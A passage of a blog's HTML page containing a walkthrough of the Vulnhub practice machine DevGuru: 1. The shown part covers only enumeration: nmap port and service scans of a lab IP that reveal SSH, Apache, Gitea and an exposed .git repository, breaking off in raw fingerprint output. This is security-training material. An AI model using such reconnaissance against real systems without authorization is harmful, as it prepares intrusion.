@@ -1,0 +1,1070 @@
+<!DOCTYPE html>
+<html lang="en-us">
+  <head>
+    
+    <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="generator" content="Hugo 0.68.3 with theme Tranquilpeak 0.4.8-BETA">
+<meta name="author" content="Tiago Tavares">
+<meta name="keywords" content="vulnhub">
+<meta name="description" content="DevGuru: 1 - A Vulnhub vulnerable machine walkthrough.">
+
+
+<meta property="og:description" content="DevGuru: 1 - A Vulnhub vulnerable machine walkthrough.">
+<meta property="og:type" content="article">
+<meta property="og:title" content="DevGuru: 1 - Vulnhub ">
+<meta name="twitter:title" content="DevGuru: 1 - Vulnhub ">
+<meta property="og:url" content="https://tiagotavares.io/2020/12/devguru-1-vulnhub/">
+<meta property="twitter:url" content="https://tiagotavares.io/2020/12/devguru-1-vulnhub/">
+<meta property="og:site_name" content="debugging the life">
+<meta property="og:description" content="DevGuru: 1 - A Vulnhub vulnerable machine walkthrough.">
+<meta name="twitter:description" content="DevGuru: 1 - A Vulnhub vulnerable machine walkthrough.">
+<meta property="og:locale" content="en-us">
+
+  
+    <meta property="article:published_time" content="2020-12-15T08:40:51">
+  
+  
+    <meta property="article:modified_time" content="2020-12-15T08:40:51">
+  
+  
+  
+    
+      <meta property="article:section" content="📜Walkthroughs">
+    
+      <meta property="article:section" content="👨‍💻Vulnhub">
+    
+  
+  
+    
+      <meta property="article:tag" content="vulnhub">
+    
+      <meta property="article:tag" content="hacking">
+    
+      <meta property="article:tag" content="ctf">
+    
+  
+
+
+<meta name="twitter:card" content="summary">
+
+  <meta name="twitter:site" content="@tiagotavares_">
+
+
+  <meta name="twitter:creator" content="@tiagotavares_">
+
+
+
+
+
+
+  <meta property="og:image" content="https://res.cloudinary.com/dtr6hzxnx/image/upload/v1608056719/blog/frank_mache_paper_icon_e3yjkh.jpg">
+  <meta property="twitter:image" content="https://res.cloudinary.com/dtr6hzxnx/image/upload/v1608056719/blog/frank_mache_paper_icon_e3yjkh.jpg">
+
+
+
+
+
+  <meta property="og:image" content="https://www.gravatar.com/avatar/e68e9fb3fa89ea576f47c7ef05d17448?s=640">
+  <meta property="twitter:image" content="https://www.gravatar.com/avatar/e68e9fb3fa89ea576f47c7ef05d17448?s=640">
+
+
+    <title>DevGuru: 1 - Vulnhub </title>
+
+    <link rel="icon" href="images/favicon-32x32.png">
+    
+
+    
+
+    <link rel="canonical" href="https://tiagotavares.io/2020/12/devguru-1-vulnhub/">
+
+    
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css" integrity="sha256-eZrrJcwDc/3uDhsdt61sL2oOBY362qM3lon1gyExkL0=" crossorigin="anonymous" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/fancybox/2.1.4/jquery.fancybox.min.css" integrity="sha256-vuXZ9LGmmwtjqFX1F+EKin1ThZMub58gKULUyf0qECk=" crossorigin="anonymous" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/fancybox/2.1.4/helpers/jquery.fancybox-thumbs.min.css" integrity="sha256-SEa4XYAHihTcEP1f5gARTB2K26Uk8PsndQYHQC1f4jU=" crossorigin="anonymous" />
+    
+    
+    <link rel="stylesheet" href="https://tiagotavares.io/css/style-twzjdbqhmnnacqs0pwwdzcdbt8yhv8giawvjqjmyfoqnvazl0dalmnhdkvp7.min.css" />
+    
+    
+
+    
+      
+<script type="application/javascript">
+var doNotTrack = false;
+if (!doNotTrack) {
+	(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+	(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+	m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+	})(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
+	ga('create', 'UA-36987137-3', 'auto');
+	
+	ga('send', 'pageview');
+}
+</script>
+
+    
+    
+  </head>
+
+  <body>
+    <div id="blog">
+      <header id="header" data-behavior="4">
+  <i id="btn-open-sidebar" class="fa fa-lg fa-bars"></i>
+  <div class="header-title">
+    <a class="header-title-link" href="https://tiagotavares.io/">debugging the life</a>
+  </div>
+  
+    
+      <a class="header-right-picture "
+         href="https://tiagotavares.io/#about">
+    
+    
+    
+      
+        <img class="header-picture" src="https://www.gravatar.com/avatar/e68e9fb3fa89ea576f47c7ef05d17448?s=90" alt="Author&#39;s picture" />
+      
+    
+    </a>
+  
+</header>
+
+      <nav id="sidebar" data-behavior="4">
+  <div class="sidebar-container">
+    
+      <div class="sidebar-profile">
+        <a href="https://tiagotavares.io/#about">
+          <img class="sidebar-profile-picture" src="https://www.gravatar.com/avatar/e68e9fb3fa89ea576f47c7ef05d17448?s=110" alt="Author&#39;s picture" />
+        </a>
+        <h4 class="sidebar-profile-name">Tiago Tavares</h4>
+        
+          <h5 class="sidebar-profile-bio">Eternal student, cybersecurity pro, husband, runner.</h5>
+        
+      </div>
+    
+    <ul class="sidebar-buttons">
+      
+  <li class="sidebar-button">
+    
+      <a class="sidebar-button-link " href="https://tiagotavares.io/">
+    
+      <i class="sidebar-button-icon fa fa-lg fa-home"></i>
+      
+      <span class="sidebar-button-desc">Home</span>
+    </a>
+  </li>
+
+  <li class="sidebar-button">
+    
+      <a class="sidebar-button-link " href="https://tiagotavares.io/categories">
+    
+      <i class="sidebar-button-icon fa fa-lg fa-bookmark"></i>
+      
+      <span class="sidebar-button-desc">Categories</span>
+    </a>
+  </li>
+
+  <li class="sidebar-button">
+    
+      <a class="sidebar-button-link " href="https://tiagotavares.io/tags">
+    
+      <i class="sidebar-button-icon fa fa-lg fa-tags"></i>
+      
+      <span class="sidebar-button-desc">Tags</span>
+    </a>
+  </li>
+
+  <li class="sidebar-button">
+    
+      <a class="sidebar-button-link " href="https://tiagotavares.io/archives">
+    
+      <i class="sidebar-button-icon fa fa-lg fa-archive"></i>
+      
+      <span class="sidebar-button-desc">Archives</span>
+    </a>
+  </li>
+
+  <li class="sidebar-button">
+    
+      <a class="sidebar-button-link " href="https://tiagotavares.io/#about">
+    
+      <i class="sidebar-button-icon fa fa-lg fa-question"></i>
+      
+      <span class="sidebar-button-desc">About</span>
+    </a>
+  </li>
+
+
+    </ul>
+    <ul class="sidebar-buttons">
+      
+  <li class="sidebar-button">
+    
+      <a class="sidebar-button-link " href="https://github.com/tiagotvrs" target="_blank" rel="noopener">
+    
+      <i class="sidebar-button-icon fa fa-lg fa-github"></i>
+      
+      <span class="sidebar-button-desc">GitHub</span>
+    </a>
+  </li>
+
+  <li class="sidebar-button">
+    
+      <a class="sidebar-button-link " href="https://www.linkedin.com/in/tiagotvrs/" target="_blank" rel="noopener">
+    
+      <i class="sidebar-button-icon fa fa-lg fa-linkedin"></i>
+      
+      <span class="sidebar-button-desc">LinkedIn</span>
+    </a>
+  </li>
+
+  <li class="sidebar-button">
+    
+      <a class="sidebar-button-link " href="https://www.strava.com/athletes/tiagotavares" target="_blank" rel="noopener">
+    
+      <i class="sidebar-button-icon fa fa-lg fa-heartbeat"></i>
+      
+      <span class="sidebar-button-desc">Strava</span>
+    </a>
+  </li>
+
+  <li class="sidebar-button">
+    
+      <a class="sidebar-button-link " href="https://twitter.com/0xtiago" target="_blank" rel="noopener">
+    
+      <i class="sidebar-button-icon fa fa-lg fa-twitter"></i>
+      
+      <span class="sidebar-button-desc">Twitter</span>
+    </a>
+  </li>
+
+
+    </ul>
+    <ul class="sidebar-buttons">
+      
+  <li class="sidebar-button">
+    
+      <a class="sidebar-button-link " href="https://tiagotavares.io/index.xml">
+    
+      <i class="sidebar-button-icon fa fa-lg fa-rss"></i>
+      
+      <span class="sidebar-button-desc">RSS</span>
+    </a>
+  </li>
+
+
+    </ul>
+  </div>
+</nav>
+
+      
+
+      <div id="main" data-behavior="4"
+        class="
+               hasCoverMetaIn
+               ">
+        <article class="post" itemscope itemType="http://schema.org/BlogPosting">
+          
+          
+            <div class="post-header main-content-wrap text-left">
+  
+    <h1 class="post-title" itemprop="headline">
+      DevGuru: 1 - Vulnhub 
+    </h1>
+  
+  
+  <div class="postShorten-meta post-meta">
+    
+      <time itemprop="datePublished" datetime="2020-12-15T08:40:51-03:00">
+        
+  December 15, 2020
+
+      </time>
+    
+    
+  
+  
+    <span>in</span>
+    
+      <a class="category-link" href="https://tiagotavares.io/categories/walkthroughs">📜Walkthroughs</a>, 
+    
+      <a class="category-link" href="https://tiagotavares.io/categories/vulnhub">👨‍💻Vulnhub</a>
+    
+  
+
+  </div>
+
+</div>
+          
+          <div class="post-content markdown" itemprop="articleBody">
+            <div class="main-content-wrap">
+              <p>DevGuru: 1 - A Vulnhub vulnerable machine walkthrough.</p>
+<h1 id="table-of-contents">Table of contents</h1>
+<ul>
+<li><a href="#-enumeration">🔎 Enumeration</a></li>
+<li><a href="#-foothold">🚪🚶 Foothold</a></li>
+<li><a href="#-privilege-escalation">🛡️ Privilege Escalation</a></li>
+<li><a href="#-complete">🍻 Complete</a></li>
+</ul>
+<h1 id="-enumeration">🔎 Enumeration</h1>
+<p>Fast nmap scan.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">┌──<span style="color:#f92672">(</span>tiago㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~<span style="color:#f92672">]</span>
+└─$ nmap -sT -p- --open 192.168.0.63
+Starting Nmap 7.91 <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2020-12-10 11:22 -03
+Nmap scan report <span style="color:#66d9ef">for</span> 192.168.0.63
+Host is up <span style="color:#f92672">(</span>0.0035s latency<span style="color:#f92672">)</span>.
+Not shown: <span style="color:#ae81ff">65532</span> closed ports
+PORT     STATE SERVICE
+22/tcp   open  ssh
+80/tcp   open  http
+8585/tcp open  unknown
+
+Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 16.46 seconds
+</code></pre></div><p>Nmap scan in detail.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">┌──<span style="color:#f92672">(</span>tiago㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~<span style="color:#f92672">]</span>
+└─$ sudo nmap -sV -A -O -p22,80,8585 192.168.0.63                      <span style="color:#ae81ff">1</span> ⨯
+<span style="color:#f92672">[</span>sudo<span style="color:#f92672">]</span> password <span style="color:#66d9ef">for</span> tiago: 
+Starting Nmap 7.91 <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2020-12-10 11:24 -03
+Nmap scan report <span style="color:#66d9ef">for</span> 192.168.0.63
+Host is up <span style="color:#f92672">(</span>0.0018s latency<span style="color:#f92672">)</span>.
+
+PORT     STATE SERVICE VERSION
+22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu <span style="color:#ae81ff">4</span> <span style="color:#f92672">(</span>Ubuntu Linux; protocol 2.0<span style="color:#f92672">)</span>
+| ssh-hostkey: 
+|   <span style="color:#ae81ff">2048</span> 2a:46:e8:2b:01:ff:57:58:7a:5f:25:a4:d6:f2:89:8e <span style="color:#f92672">(</span>RSA<span style="color:#f92672">)</span>
+|   <span style="color:#ae81ff">256</span> 08:79:93:9c:e3:b4:a4:be:80:ad:61:9d:d3:88:d2:84 <span style="color:#f92672">(</span>ECDSA<span style="color:#f92672">)</span>
+|_  <span style="color:#ae81ff">256</span> 9c:f9:88:d4:33:77:06:4e:d9:7c:39:17:3e:07:9c:bd <span style="color:#f92672">(</span>ED25519<span style="color:#f92672">)</span>
+80/tcp   open  http    Apache httpd 2.4.29 <span style="color:#f92672">((</span>Ubuntu<span style="color:#f92672">))</span>
+|_http-generator: DevGuru
+| http-git: 
+|   192.168.0.63:80/.git/
+|     Git repository found!
+|     Repository description: Unnamed repository; edit this file <span style="color:#e6db74">&#39;description&#39;</span> to name the...
+|     Last commit message: first commit 
+|     Remotes:
+|       http://devguru.local:8585/frank/devguru-website.git
+|_    Project type: PHP application <span style="color:#f92672">(</span>guessed from .gitignore<span style="color:#f92672">)</span>
+|_http-server-header: Apache/2.4.29 <span style="color:#f92672">(</span>Ubuntu<span style="color:#f92672">)</span>
+|_http-title: Corp - DevGuru
+8585/tcp open  unknown
+| fingerprint-strings: 
+|   GenericLines: 
+|     HTTP/1.1 <span style="color:#ae81ff">400</span> Bad Request
+|     Content-Type: text/plain; charset<span style="color:#f92672">=</span>utf-8
+|     Connection: close
+|     Request
+|   GetRequest: 
+|     HTTP/1.0 <span style="color:#ae81ff">200</span> OK
+|     Content-Type: text/html; charset<span style="color:#f92672">=</span>UTF-8
+|     Set-Cookie: lang<span style="color:#f92672">=</span>en-US; Path<span style="color:#f92672">=</span>/; Max-Age<span style="color:#f92672">=</span>2147483647
+|     Set-Cookie: i_like_gitea<span style="color:#f92672">=</span>60a60f9a3f2071e6; Path<span style="color:#f92672">=</span>/; HttpOnly
+|     Set-Cookie: _csrf<span style="color:#f92672">=</span>gZLNwT-DkBTkP2Femsn0l4c6rU46MTYwNzYxMDI5MDY1NDc0OTg2Mg; Path<span style="color:#f92672">=</span>/; Expires<span style="color:#f92672">=</span>Fri, <span style="color:#ae81ff">11</span> Dec <span style="color:#ae81ff">2020</span> 14:24:50 GMT; HttpOnly
+|     X-Frame-Options: SAMEORIGIN
+|     Date: Thu, <span style="color:#ae81ff">10</span> Dec <span style="color:#ae81ff">2020</span> 14:24:50 GMT
+|     &lt;!DOCTYPE html&gt;
+|     &lt;html lang<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;en-US&#34;</span> class<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;theme-&#34;</span>&gt;
+|     &lt;head data-suburl<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;&#34;</span>&gt;
+|     &lt;meta charset<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;utf-8&#34;</span>&gt;
+|     &lt;meta name<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;viewport&#34;</span> content<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;width=device-width, initial-scale=1&#34;</span>&gt;
+|     &lt;meta http-equiv<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;x-ua-compatible&#34;</span> content<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;ie=edge&#34;</span>&gt;
+|     &lt;title&gt; Gitea: Git with a cup of tea &lt;/title&gt;
+|     &lt;link rel<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;manifest&#34;</span> href<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;/manifest.json&#34;</span> crossorigin<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;use-credentials&#34;</span>&gt;
+|     &lt;meta name<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;theme-color&#34;</span> content<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;#6cc644&#34;</span>&gt;
+|     &lt;meta name<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;author&#34;</span> content<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;Gitea - Git with a cup of tea&#34;</span> /&gt;
+|     &lt;meta name<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;description&#34;</span> content<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;Gitea (Git with a cup of tea) is a painless
+</span><span style="color:#e6db74">|   HTTPOptions: 
+</span><span style="color:#e6db74">|     HTTP/1.0 404 Not Found
+</span><span style="color:#e6db74">|     Content-Type: text/html; charset=UTF-8
+</span><span style="color:#e6db74">|     Set-Cookie: lang=en-US; Path=/; Max-Age=2147483647
+</span><span style="color:#e6db74">|     Set-Cookie: i_like_gitea=5dba56f953e777cd; Path=/; HttpOnly
+</span><span style="color:#e6db74">|     Set-Cookie: _csrf=qFWDFJyuERvO3K1gxAiy1eV2lG86MTYwNzYxMDI5MDc3MDAyMjI4Ng; Path=/; Expires=Fri, 11 Dec 2020 14:24:50 GMT; HttpOnly
+</span><span style="color:#e6db74">|     X-Frame-Options: SAMEORIGIN
+</span><span style="color:#e6db74">|     Date: Thu, 10 Dec 2020 14:24:50 GMT
+</span><span style="color:#e6db74">|     &lt;!DOCTYPE html&gt;
+</span><span style="color:#e6db74">|     &lt;html lang=&#34;</span>en-US<span style="color:#e6db74">&#34; class=&#34;</span>theme-<span style="color:#e6db74">&#34;&gt;
+</span><span style="color:#e6db74">|     &lt;head data-suburl=&#34;&#34;&gt;
+</span><span style="color:#e6db74">|     &lt;meta charset=&#34;</span>utf-8<span style="color:#e6db74">&#34;&gt;
+</span><span style="color:#e6db74">|     &lt;meta name=&#34;</span>viewport<span style="color:#e6db74">&#34; content=&#34;</span>width<span style="color:#f92672">=</span>device-width, initial-scale<span style="color:#f92672">=</span>1<span style="color:#e6db74">&#34;&gt;
+</span><span style="color:#e6db74">|     &lt;meta http-equiv=&#34;</span>x-ua-compatible<span style="color:#e6db74">&#34; content=&#34;</span>ie<span style="color:#f92672">=</span>edge<span style="color:#e6db74">&#34;&gt;
+</span><span style="color:#e6db74">|     &lt;title&gt;Page Not Found - Gitea: Git with a cup of tea &lt;/title&gt;
+</span><span style="color:#e6db74">|     &lt;link rel=&#34;</span>manifest<span style="color:#e6db74">&#34; href=&#34;</span>/manifest.json<span style="color:#e6db74">&#34; crossorigin=&#34;</span>use-credentials<span style="color:#e6db74">&#34;&gt;
+</span><span style="color:#e6db74">|     &lt;meta name=&#34;</span>theme-color<span style="color:#e6db74">&#34; content=&#34;</span><span style="color:#75715e">#6cc644&#34;&gt;</span>
+|     &lt;meta name<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;author&#34;</span> content<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;Gitea - Git with a cup of tea&#34;</span> /&gt;
+|_    &lt;meta name<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;description&#34;</span> content<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;Gitea (Git with a c
+</span><span style="color:#e6db74">1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
+</span><span style="color:#e6db74">SF-Port8585-TCP:V=7.91%I=7%D=12/10%Time=5FD22FB2%P=x86_64-pc-linux-gnu%r(G
+</span><span style="color:#e6db74">SF:enericLines,67,&#34;</span>HTTP/1<span style="color:#ae81ff">\.</span>1<span style="color:#ae81ff">\x</span>20400<span style="color:#ae81ff">\x</span>20Bad<span style="color:#ae81ff">\x</span>20Request<span style="color:#ae81ff">\r\n</span>Content-Type:<span style="color:#ae81ff">\x</span>20
+SF:text/plain;<span style="color:#ae81ff">\x</span>20charset<span style="color:#f92672">=</span>utf-8<span style="color:#ae81ff">\r\n</span>Connection:<span style="color:#ae81ff">\x</span>20close<span style="color:#ae81ff">\r\n\r\n</span>400<span style="color:#ae81ff">\x</span>20Bad<span style="color:#ae81ff">\</span>
+SF:x20Request<span style="color:#e6db74">&#34;)%r(GetRequest,2A02,&#34;</span>HTTP/1<span style="color:#ae81ff">\.</span>0<span style="color:#ae81ff">\x</span>20200<span style="color:#ae81ff">\x</span>20OK<span style="color:#ae81ff">\r\n</span>Content-Type:
+SF:<span style="color:#ae81ff">\x</span>20text/html;<span style="color:#ae81ff">\x</span>20charset<span style="color:#f92672">=</span>UTF-8<span style="color:#ae81ff">\r\n</span>Set-Cookie:<span style="color:#ae81ff">\x</span>20lang<span style="color:#f92672">=</span>en-US;<span style="color:#ae81ff">\x</span>20Path<span style="color:#f92672">=</span>/
+SF:;<span style="color:#ae81ff">\x</span>20Max-Age<span style="color:#f92672">=</span>2147483647<span style="color:#ae81ff">\r\n</span>Set-Cookie:<span style="color:#ae81ff">\x</span>20i_like_gitea<span style="color:#f92672">=</span>60a60f9a3f2071e6
+SF:;<span style="color:#ae81ff">\x</span>20Path<span style="color:#f92672">=</span>/;<span style="color:#ae81ff">\x</span>20HttpOnly<span style="color:#ae81ff">\r\n</span>Set-Cookie:<span style="color:#ae81ff">\x</span>20_csrf<span style="color:#f92672">=</span>gZLNwT-DkBTkP2Femsn0l4
+SF:c6rU46MTYwNzYxMDI5MDY1NDc0OTg2Mg;<span style="color:#ae81ff">\x</span>20Path<span style="color:#f92672">=</span>/;<span style="color:#ae81ff">\x</span>20Expires<span style="color:#f92672">=</span>Fri,<span style="color:#ae81ff">\x</span>2011<span style="color:#ae81ff">\x</span>20D
+SF:ec<span style="color:#ae81ff">\x</span>202020<span style="color:#ae81ff">\x</span>2014:24:50<span style="color:#ae81ff">\x</span>20GMT;<span style="color:#ae81ff">\x</span>20HttpOnly<span style="color:#ae81ff">\r\n</span>X-Frame-Options:<span style="color:#ae81ff">\x</span>20SAMEO
+SF:RIGIN<span style="color:#ae81ff">\r\n</span>Date:<span style="color:#ae81ff">\x</span>20Thu,<span style="color:#ae81ff">\x</span>2010<span style="color:#ae81ff">\x</span>20Dec<span style="color:#ae81ff">\x</span>202020<span style="color:#ae81ff">\x</span>2014:24:50<span style="color:#ae81ff">\x</span>20GMT<span style="color:#ae81ff">\r\n\r\n</span>&lt;
+SF:!DOCTYPE<span style="color:#ae81ff">\x</span>20html&gt;<span style="color:#ae81ff">\n</span>&lt;html<span style="color:#ae81ff">\x</span>20lang<span style="color:#f92672">=</span><span style="color:#ae81ff">\&#34;</span>en-US<span style="color:#ae81ff">\&#34;\x</span>20class<span style="color:#f92672">=</span><span style="color:#ae81ff">\&#34;</span>theme-<span style="color:#ae81ff">\&#34;</span>&gt;<span style="color:#ae81ff">\n</span>&lt;head<span style="color:#ae81ff">\</span>
+SF:x20data-suburl<span style="color:#f92672">=</span><span style="color:#ae81ff">\&#34;\&#34;</span>&gt;<span style="color:#ae81ff">\n\t</span>&lt;meta<span style="color:#ae81ff">\x</span>20charset<span style="color:#f92672">=</span><span style="color:#ae81ff">\&#34;</span>utf-8<span style="color:#ae81ff">\&#34;</span>&gt;<span style="color:#ae81ff">\n\t</span>&lt;meta<span style="color:#ae81ff">\x</span>20name<span style="color:#f92672">=</span><span style="color:#ae81ff">\&#34;</span>
+SF:viewport<span style="color:#ae81ff">\&#34;\x</span>20content<span style="color:#f92672">=</span><span style="color:#ae81ff">\&#34;</span>width<span style="color:#f92672">=</span>device-width,<span style="color:#ae81ff">\x</span>20initial-scale<span style="color:#f92672">=</span>1<span style="color:#ae81ff">\&#34;</span>&gt;<span style="color:#ae81ff">\n\t</span>&lt;m
+SF:eta<span style="color:#ae81ff">\x</span>20http-equiv<span style="color:#f92672">=</span><span style="color:#ae81ff">\&#34;</span>x-ua-compatible<span style="color:#ae81ff">\&#34;\x</span>20content<span style="color:#f92672">=</span><span style="color:#ae81ff">\&#34;</span>ie<span style="color:#f92672">=</span>edge<span style="color:#ae81ff">\&#34;</span>&gt;<span style="color:#ae81ff">\n\t</span>&lt;title
+SF:&gt;<span style="color:#ae81ff">\x</span>20Gitea:<span style="color:#ae81ff">\x</span>20Git<span style="color:#ae81ff">\x</span>20with<span style="color:#ae81ff">\x</span>20a<span style="color:#ae81ff">\x</span>20cup<span style="color:#ae81ff">\x</span>20of<span style="color:#ae81ff">\x</span>20tea<span style="color:#ae81ff">\x</span>20&lt;/title&gt;<span style="color:#ae81ff">\n\t</span>&lt;lin
+SF:k<span style="color:#ae81ff">\x</span>20rel<span style="color:#f92672">=</span><span style="color:#ae81ff">\&#34;</span>manifest<span style="color:#ae81ff">\&#34;\x</span>20href<span style="color:#f92672">=</span><span style="color:#ae81ff">\&#34;</span>/manifest<span style="color:#ae81ff">\.</span>json<span style="color:#ae81ff">\&#34;\x</span>20crossorigin<span style="color:#f92672">=</span><span style="color:#ae81ff">\&#34;</span>use-
+SF:credentials<span style="color:#ae81ff">\&#34;</span>&gt;<span style="color:#ae81ff">\n\t</span>&lt;meta<span style="color:#ae81ff">\x</span>20name<span style="color:#f92672">=</span><span style="color:#ae81ff">\&#34;</span>theme-color<span style="color:#ae81ff">\&#34;\x</span>20content<span style="color:#f92672">=</span><span style="color:#ae81ff">\&#34;</span><span style="color:#75715e">#6cc644\&#34;&gt;</span>
+SF:<span style="color:#ae81ff">\n\t</span>&lt;meta<span style="color:#ae81ff">\x</span>20name<span style="color:#f92672">=</span><span style="color:#ae81ff">\&#34;</span>author<span style="color:#ae81ff">\&#34;\x</span>20content<span style="color:#f92672">=</span><span style="color:#ae81ff">\&#34;</span>Gitea<span style="color:#ae81ff">\x</span>20-<span style="color:#ae81ff">\x</span>20Git<span style="color:#ae81ff">\x</span>20with<span style="color:#ae81ff">\x</span>20
+SF:a<span style="color:#ae81ff">\x</span>20cup<span style="color:#ae81ff">\x</span>20of<span style="color:#ae81ff">\x</span>20tea<span style="color:#ae81ff">\&#34;\x</span>20/&gt;<span style="color:#ae81ff">\n\t</span>&lt;meta<span style="color:#ae81ff">\x</span>20name<span style="color:#f92672">=</span><span style="color:#ae81ff">\&#34;</span>description<span style="color:#ae81ff">\&#34;\x</span>20conte
+SF:nt<span style="color:#f92672">=</span><span style="color:#ae81ff">\&#34;</span>Gitea<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\(</span>Git<span style="color:#ae81ff">\x</span>20with<span style="color:#ae81ff">\x</span>20a<span style="color:#ae81ff">\x</span>20cup<span style="color:#ae81ff">\x</span>20of<span style="color:#ae81ff">\x</span>20tea<span style="color:#ae81ff">\)\x</span>20is<span style="color:#ae81ff">\x</span>20a<span style="color:#ae81ff">\x</span>20pa
+SF:inless<span style="color:#e6db74">&#34;)%r(HTTPOptions,212A,&#34;</span>HTTP/1<span style="color:#ae81ff">\.</span>0<span style="color:#ae81ff">\x</span>20404<span style="color:#ae81ff">\x</span>20Not<span style="color:#ae81ff">\x</span>20Found<span style="color:#ae81ff">\r\n</span>Conten
+SF:t-Type:<span style="color:#ae81ff">\x</span>20text/html;<span style="color:#ae81ff">\x</span>20charset<span style="color:#f92672">=</span>UTF-8<span style="color:#ae81ff">\r\n</span>Set-Cookie:<span style="color:#ae81ff">\x</span>20lang<span style="color:#f92672">=</span>en-US;<span style="color:#ae81ff">\x</span>2
+SF:0Path<span style="color:#f92672">=</span>/;<span style="color:#ae81ff">\x</span>20Max-Age<span style="color:#f92672">=</span>2147483647<span style="color:#ae81ff">\r\n</span>Set-Cookie:<span style="color:#ae81ff">\x</span>20i_like_gitea<span style="color:#f92672">=</span>5dba56f95
+SF:3e777cd;<span style="color:#ae81ff">\x</span>20Path<span style="color:#f92672">=</span>/;<span style="color:#ae81ff">\x</span>20HttpOnly<span style="color:#ae81ff">\r\n</span>Set-Cookie:<span style="color:#ae81ff">\x</span>20_csrf<span style="color:#f92672">=</span>qFWDFJyuERvO3K1
+SF:gxAiy1eV2lG86MTYwNzYxMDI5MDc3MDAyMjI4Ng;<span style="color:#ae81ff">\x</span>20Path<span style="color:#f92672">=</span>/;<span style="color:#ae81ff">\x</span>20Expires<span style="color:#f92672">=</span>Fri,<span style="color:#ae81ff">\x</span>20
+SF:11<span style="color:#ae81ff">\x</span>20Dec<span style="color:#ae81ff">\x</span>202020<span style="color:#ae81ff">\x</span>2014:24:50<span style="color:#ae81ff">\x</span>20GMT;<span style="color:#ae81ff">\x</span>20HttpOnly<span style="color:#ae81ff">\r\n</span>X-Frame-Options:<span style="color:#ae81ff">\x</span>
+SF:20SAMEORIGIN<span style="color:#ae81ff">\r\n</span>Date:<span style="color:#ae81ff">\x</span>20Thu,<span style="color:#ae81ff">\x</span>2010<span style="color:#ae81ff">\x</span>20Dec<span style="color:#ae81ff">\x</span>202020<span style="color:#ae81ff">\x</span>2014:24:50<span style="color:#ae81ff">\x</span>20GMT<span style="color:#ae81ff">\r</span>
+SF:<span style="color:#ae81ff">\n\r\n</span>&lt;!DOCTYPE<span style="color:#ae81ff">\x</span>20html&gt;<span style="color:#ae81ff">\n</span>&lt;html<span style="color:#ae81ff">\x</span>20lang<span style="color:#f92672">=</span><span style="color:#ae81ff">\&#34;</span>en-US<span style="color:#ae81ff">\&#34;\x</span>20class<span style="color:#f92672">=</span><span style="color:#ae81ff">\&#34;</span>theme-<span style="color:#ae81ff">\&#34;</span>&gt;<span style="color:#ae81ff">\</span>
+SF:n&lt;head<span style="color:#ae81ff">\x</span>20data-suburl<span style="color:#f92672">=</span><span style="color:#ae81ff">\&#34;\&#34;</span>&gt;<span style="color:#ae81ff">\n\t</span>&lt;meta<span style="color:#ae81ff">\x</span>20charset<span style="color:#f92672">=</span><span style="color:#ae81ff">\&#34;</span>utf-8<span style="color:#ae81ff">\&#34;</span>&gt;<span style="color:#ae81ff">\n\t</span>&lt;meta<span style="color:#ae81ff">\x</span>20
+SF:name<span style="color:#f92672">=</span><span style="color:#ae81ff">\&#34;</span>viewport<span style="color:#ae81ff">\&#34;\x</span>20content<span style="color:#f92672">=</span><span style="color:#ae81ff">\&#34;</span>width<span style="color:#f92672">=</span>device-width,<span style="color:#ae81ff">\x</span>20initial-scale<span style="color:#f92672">=</span>1<span style="color:#ae81ff">\&#34;</span>
+SF:&gt;<span style="color:#ae81ff">\n\t</span>&lt;meta<span style="color:#ae81ff">\x</span>20http-equiv<span style="color:#f92672">=</span><span style="color:#ae81ff">\&#34;</span>x-ua-compatible<span style="color:#ae81ff">\&#34;\x</span>20content<span style="color:#f92672">=</span><span style="color:#ae81ff">\&#34;</span>ie<span style="color:#f92672">=</span>edge<span style="color:#ae81ff">\&#34;</span>&gt;<span style="color:#ae81ff">\n\</span>
